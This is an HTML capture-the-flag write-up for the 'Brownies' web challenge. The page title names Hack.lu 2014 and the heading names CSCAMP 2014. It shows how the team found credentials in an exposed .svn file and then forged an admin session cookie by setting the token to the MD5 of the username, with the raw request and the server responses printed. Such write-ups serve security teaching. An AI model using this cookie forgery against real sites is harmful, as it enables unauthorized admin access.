
	<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
	<head>
	<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8" />
	<meta name="generator" content="AsciiDoc 8.6.9" />
	<title>Hack.lu CTF 2014: Brownies</title>
	<link rel="stylesheet" href="http://markable.in/site_media/static/bootstrap/css/bootstrap.min.css">
	</script>
	<style>
	body {
		margin:2em 2em 2em 2em
	}
	</style>
</head>

<h2> CSCAMP 2014 CTF:  Brownies 350 point web challenge </h2>
<h3>By Abstract, A Finite Number of Monkeys</h3>

<p>The challenge was to get admin access to a website running at
http://178.63.58.69:8083. This URL provided a simple log on page,
which asked for a username and password.</p>

<p> The challenge description came with the hint: <it>think of default
files when using source code management systems</it>, so after some
experimenting we found a file at http://178.63.58.69:8083/.svn with
the contents</p>

<pre>
  <code>
user: ping
pass: pong

admin: john
  </code>
</pre>



This tells us that the password for the "ping" account and that the admin
account is called "john". Logging on to the http://178.63.58.69:8083
site with the ping account details the server replies with:

<pre>
  <code>
HTTP/1.1 200 OK
Date: Sat, 22 Nov 2014 19:24:23 GMT
Server: Apache/2.4.6 (CentOS) PHP/5.4.16
X-Powered-By: PHP/5.4.16
Set-Cookie: type=user
Set-Cookie: flag=df911f0151f9ef021d410b4be5060972
Set-Cookie: name=ping
Content-Length: 53
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

&lt;h4&gt; Welcome: ping&lt;/h4&gt;&lt;a href='index.php'&gt;Logout&lt;/a&gt;
  </code>
</pre>


<p>The interesting part here is the cookie, this seems to be the user
name, the access level and an authentication token (no, it's not the
flag, although we did try submitting it). Deciding it might be a hash
we tried cracking it (typing it into Google), we found that it was the
MD5 hash of "ping". So we trying requesting the login page with the
account john, type admin, and the "flag" set to the MD5 hash of"john", by
sending the message:

<pre>
  <code>
GET /login.php HTTP/1.1
Host: 178.63.58.69:8083
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:27.0) Gecko/20100101 Firefox/27.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: type=admin; flag=527bd5b5d689e2c32ae974c6229ff785; name=john
Connection: keep-alive
  </code>
</pre>

and got the reply:

<pre>
  <code>
Hi faked admin :)

Flag: 'a012c434d1ec6db911fda4884de14fdd'
  </code>
</pre>

which was the true flag and submitting it got us the 350 points.</p>

<p>We used the Burp proxy to intercept and edit the HTTP
traffic. While not that complex their were a few dead ends, the login
page seems susceptible to SQL injection attacks, and the log in request
had a hidden field: file="auth.txt", both of which we spent a lot of
time working on before finding the correct solution, additionally, the last message had to be a GET rather than a POST.</p>  

<p></p>
